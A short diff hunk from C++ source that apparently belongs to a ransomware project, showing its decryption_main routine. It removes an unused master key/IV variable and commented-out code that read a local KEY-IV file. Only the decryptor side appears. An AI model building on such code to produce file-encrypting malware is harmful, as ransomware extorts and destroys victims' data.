@@ -221,22 +221,13 @@ static void iterate(const path& parent, RsaDecryptor rsaDecryptor) {
 
 int decryption_main()
 {
-	PBYTE masterIV = nullptr, masterKey = nullptr;
 	std::string id;
 	Status status;
 	string path = ROOT_DIR;
 	string pathToID = get_path_to_id();
 	std::ifstream idFile;
 	RsaDecryptor rsaDecryptor;
-	StringPrivateBlob stringPrivateBlob;
-
-//	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
-//	std::ifstream masterKeyIVFile;
-//	masterKeyIVFile.open(pathToMasters, std::ios::binary);
-//	masterKeyIVFile.read((char*)masterKey, KEY_LEN);
-//	masterKeyIVFile.read((char*)masterIV, IV_LEN);
-//	masterKeyIVFile.close();
-	
+	StringPrivateBlob stringPrivateBlob;	
 	
 	idFile.open(pathToID, std::ios::binary);
 	id = string((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
